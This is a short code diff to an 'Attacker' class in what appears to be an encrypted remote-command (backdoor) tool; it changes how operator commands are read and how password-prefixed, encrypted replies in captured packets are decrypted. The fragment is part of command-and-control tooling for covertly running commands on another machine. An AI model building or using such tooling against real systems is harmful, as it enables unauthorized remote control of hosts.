@@ -67,7 +67,7 @@ class Attacker(object):
 
     def sendCommand(self):
         while True:
-            cmd = input(" ")
+            cmd = raw_input()
             sys.stdout.flush()
             payload = encryption.encrypt(self.password + cmd)
             if self.protocol == 'TCP':
@@ -85,11 +85,13 @@ class Attacker(object):
         """
         """
         payload = packet[self.protocol].payload.load
-        data = helpers.decode(encryption.decrypt(payload))
+        data = encryption.decrypt(payload)
+
         if data == "":
             return
         password = data[:8]
         result = data[8:]
+
         if password not in self.password:
             return
         else:
